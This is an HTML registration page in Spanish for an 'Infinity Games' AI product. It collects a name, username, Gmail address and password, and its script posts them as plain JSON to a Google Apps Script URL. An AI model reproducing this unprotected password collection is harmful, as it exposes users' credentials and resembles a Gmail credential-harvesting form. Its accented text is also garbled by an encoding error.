<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Infinity Games - Registro para IA</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #1a1a2e, #16213e);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            color: #fff;
        }
        
        .container {
            width: 100%;
            max-width: 450px;
            padding: 2rem;
        }
        
        .logo-container {
            text-align: center;
            margin-bottom: 2rem;
        }
        
        .logo {
            font-size: 2.5rem;
            font-weight: bold;
            color: #fff;
            text-shadow: 0 0 10px rgba(77, 213, 253, 0.7);
            letter-spacing: 1px;
        }
        
        .tagline {
            font-size: 1rem;
            color: #b8c5d9;
            margin-top: 0.5rem;
        }
        
        .card {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 16px;
            padding: 2rem;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        h1 {
            font-size: 1.75rem;
            margin-bottom: 1.5rem;
            text-align: center;
            color: #fff;
        }
        
        .form-group {
            margin-bottom: 1.25rem;
        }
        
        label {
            display: block;
            margin-bottom: 0.5rem;
            font-size: 0.9rem;
            color: #b8c5d9;
        }
        
        input {
            width: 100%;
            padding: 0.75rem 1rem;
            background: rgba(255, 255, 255, 0.07);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            color: #fff;
            font-size: 1rem;
            transition: all 0.3s;
        }
        
        input:focus {
            outline: none;
            border-color: #4dd5fd;
            box-shadow: 0 0 0 2px rgba(77, 213, 253, 0.3);
        }
        
        button {
            width: 100%;
            padding: 0.75rem;
            background: linear-gradient(90deg, #4dd5fd, #0051ff);
            border: none;
            border-radius: 8px;
            color: #fff;
            font-size: 1rem;
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.3s, box-shadow 0.3s;
            margin-top: 1rem;
            box-shadow: 0 4px 12px rgba(77, 213, 253, 0.3);
        }
        
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 16px rgba(77, 213, 253, 0.4);
        }
        
        .alert {
            padding: 1rem;
            border-radius: 8px;
            margin-top: 1.5rem;
            display: none;
            text-align: center;
            font-weight: 500;
        }
        
        .alert-success {
            background-color: rgba(46, 213, 115, 0.15);
            border: 1px solid rgba(46, 213, 115, 0.3);
            color: #2ed573;
        }
        
        .alert-error {
            background-color: rgba(255, 71, 87, 0.15);
            border: 1px solid rgba(255, 71, 87, 0.3);
            color: #ff4757;
        }
        
        .footer {
            margin-top: 2rem;
            text-align: center;
            color: rgba(255, 255, 255, 0.5);
            font-size: 0.8rem;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo-container">
            <div class="logo">INFINITY GAMES</div>
            <div class="tagline">Experiencias de juego sin l√≠mites</div>
        </div>
        
        <div class="card">
            <h1>Reg√≠strate para nuestra IA</h1>
            <form id="registroForm">
                <div class="form-group">
                    <label for="nombre">Nombre</label>
                    <input type="text" id="nombre" required placeholder="Tu nombre">
                </div>
                
                <div class="form-group">
                    <label for="usuario">Usuario</label>
                    <input type="text" id="usuario" required placeholder="Elige un nombre de usuario">
                </div>
                
                <div class="form-group">
                    <label for="gmail">Gmail</label>
                    <input type="email" id="gmail" required placeholder="ejemplo@gmail.com">
                </div>
                
                <div class="form-group">
                    <label for="contrasena">Contrase√±a</label>
                    <input type="password" id="contrasena" required placeholder="Crea una contrase√±a segura">
                </div>
                
                <button type="submit">REGISTRARSE</button>
            </form>
            
            <div id="alertSuccess" class="alert alert-success">
                ¬°Te has registrado con √©xito! Pronto recibir√°s informaci√≥n sobre nuestra IA.
            </div>
            
            <div id="alertError" class="alert alert-error">
                Algo ha fallado. Por favor, verifica tus datos e int√©ntalo nuevamente.
            </div>
        </div>
        
        <div class="footer">
            ¬© 2025 Infinity Games - Todos los derechos reservados
        </div>
    </div>
    
    <script>
        document.getElementById('registroForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const nombre = document.getElementById('nombre').value.trim();
            const usuario = document.getElementById('usuario').value.trim();
            const gmail = document.getElementById('gmail').value.trim();
            const contrasena = document.getElementById('contrasena').value.trim();
            
            if (!nombre || !usuario || !gmail || !contrasena) {
                mostrarAlerta('alertError');
                return;
            }
            
            if (!gmail.endsWith('@gmail.com')) {
                mostrarAlerta('alertError');
                return;
            }

            // üëâ Cambia ESTA URL por la de tu Apps Script
            const url = "https://script.google.com/macros/s/AKfycbxPvNwPYOoto2VHSaa180mXZmcNd61dgrXMPRfZ4sPVnsj5xixzRNLBjSA1v3uCawSYHA/exec";
            
            fetch(url, {
                method: "POST",
                contentType: "application/json",
                body: JSON.stringify({
                    nombre: nombre,
                    usuario: usuario,
                    gmail: gmail,
                    contrasena: contrasena
                })
            })
            .then(response => response.text())
            .then(data => {
                if (data === "OK") {
                    mostrarAlerta('alertSuccess');
                    document.getElementById('registroForm').reset();
                } else {
                    mostrarAlerta('alertError');
                }
            })
            .catch(error => {
                console.error("Error:", error);
                mostrarAlerta('alertError');
            });
        });

        function mostrarAlerta(alertId) {
            document.getElementById('alertSuccess').style.display = 'none';
            document.getElementById('alertError').style.display = 'none';
            document.getElementById(alertId).style.display = 'block';
            
            setTimeout(function() {
                document.getElementById(alertId).style.display = 'none';
            }, 5000);
        }
    </script>
</body>
</html>
